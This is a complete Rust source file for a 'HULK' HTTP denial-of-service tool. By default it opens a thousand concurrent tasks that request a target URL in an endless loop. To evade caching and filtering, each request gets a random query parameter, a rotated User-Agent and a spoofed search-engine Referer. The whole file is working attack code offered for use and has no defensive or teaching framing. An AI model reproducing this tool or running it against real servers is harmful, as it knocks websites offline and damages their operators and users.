use clap::Parser;
use futures::future::join_all;
use hyper::body::HttpBody as _;
use hyper::{Body, Client, Request};
use hyper_tls::HttpsConnector;
use rand::distributions::Alphanumeric;
use rand::{thread_rng, Rng};
use std::sync::atomic::{AtomicUsize, Ordering};
use std::{
    fs::File,
    io,
    io::{prelude::*, BufReader, Write},
    path::Path,
};

static REQ_COUNT: AtomicUsize = AtomicUsize::new(0);
static ERR_COUNT: AtomicUsize = AtomicUsize::new(0);
static FAIL_COUNT: AtomicUsize = AtomicUsize::new(0);
static USER_AGENTS: &'static [&'static str] = &[
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0",
    "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:96.0) Gecko/20100101 Firefox/96.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 Edg/97.0.1072.69",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0",
    ];
static REFERERS: &'static [&'static str] = &[
    "https://www.google.com/?q=",
    "https://bing.com/search?q=",
    "https://yandex.ru/yandsearch?text=",
];

#[derive(Parser, Debug)]
#[clap(author = "Hexalyse", about = "HULK DoS tool")]
struct CliArguments {
    /// Maximum number of concurrent connections to the target
    #[clap(short, default_value = "1000")]
    max_connections: usize,
    /// Target URL (eg. http://example.com)
    target: String,
    /// verbose mode (display HTTP error codes)
    #[clap(short, long, takes_value = false, required = false)]
    verbose: bool,
    /// File containing a list of user agents to use
    #[clap(short, takes_value = true, required = false)]
    user_agents_file: Option<String>,
    /// Name of a GET parameter to add to the request (the value will be fuzzed, instead of fuzzing both the name of a GET parameter and its value)
    #[clap(short, takes_value = true, required = false)]
    parameter_name: Option<String>,
    /// File containing a list of Referers to use (a random string will be appended to each Referer)
    #[clap(short, takes_value = true, required = false)]
    referers_file: Option<String>,
}

fn lines_from_file(filename: impl AsRef<Path> + std::marker::Copy) -> Vec<String> {
    let file = File::open(filename)
        .expect(format!("No such file: {}", filename.as_ref().display()).as_str());
    let buf = BufReader::new(file);
    buf.lines()
        .map(|l| l.expect("Could not parse line"))
        .filter(|x| !x.is_empty())
        .collect()
}

fn random_string(n: usize) -> String {
    thread_rng()
        .sample_iter(&Alphanumeric)
        .take(n)
        .map(char::from)
        .collect()
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    let args = CliArguments::parse();
    let user_agents = if let Some(user_agents_file) = args.user_agents_file {
        lines_from_file(user_agents_file.as_str())
    } else {
        USER_AGENTS.iter().map(|x| x.to_string()).collect()
    };
    let referers = if let Some(referers_file) = args.referers_file {
        lines_from_file(referers_file.as_str())
    } else {
        REFERERS.iter().map(|x| x.to_string()).collect()
    };
    println!("[*] Starting HULK attack on {}", args.target);
    let tasks = (0..args.max_connections).map(|_| {
        // clone the arguments to pass to the task since we are move-ing them
        let target = args.target.clone();
        let parameter_name = args.parameter_name.clone();
        let user_agents = user_agents.clone();
        let referers = referers.clone();
        tokio::spawn(async move {
            fetch_url(target, args.verbose, parameter_name, user_agents, referers).await
        })
    });
    join_all(tasks).await;
    Ok(())
}

async fn fetch_url(
    target: String,
    verbose: bool,
    parameter_name: Option<String>,
    user_agents: Vec<String>,
    referers: Vec<String>,
) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    let https = HttpsConnector::new();
    let client = Client::builder().build::<_, hyper::Body>(https);
    let user_agents_len = user_agents.len();
    loop {
        let uri = if target.contains("?") {
            format!(
                "{}&{}={}",
                target,
                parameter_name
                    .as_deref()
                    .unwrap_or(random_string(10).as_str()),
                random_string(10)
            )
        } else {
            format!(
                "{}?{}={}",
                target,
                parameter_name
                    .as_deref()
                    .unwrap_or(random_string(10).as_str()),
                random_string(10)
            )
        };
        let referer = format!(
            "{}{}",
            referers[rand::thread_rng().gen_range(0..referers.len())],
            random_string(rand::thread_rng().gen_range(5..10))
        );
        let user_agent = user_agents[rand::thread_rng().gen_range(0..user_agents_len)].clone();
        let request = Request::get(uri)
            .header("User-Agent", user_agent)
            .header("Referer", referer)
            .body(Body::empty())
            .unwrap();

        let resp = client.request(request).await;
        // Do not return on error, to allow keeping the max number of tasks running
        let mut resp = match resp {
            Ok(resp) => resp,
            Err(_) => {
                FAIL_COUNT.fetch_add(1, Ordering::Relaxed);
                continue;
            }
        };
        if resp.status() != hyper::StatusCode::OK {
            if verbose {
                println!("\n[!] Error: {}", resp.status());
            }
            ERR_COUNT.fetch_add(1, Ordering::Relaxed);
        }
        let total_reqs = REQ_COUNT.fetch_add(1, Ordering::Relaxed) + 1;
        if total_reqs % 100 == 1 {
            let err_count = ERR_COUNT.load(Ordering::Relaxed);
            // sometimes the error count is higher than total requests
            // so we need to check for that not to get a substract with overflow
            let ok_count = if total_reqs >= err_count {
                total_reqs - err_count
            } else {
                0
            };
            print!(
                "\r[*] {} requests | {} OK | {} server errors | {} failed requests",
                total_reqs,
                ok_count,
                err_count,
                FAIL_COUNT.load(Ordering::Relaxed)
            );
            io::stdout().flush().unwrap();
        }

        resp.body_mut().data().await;
    }
}
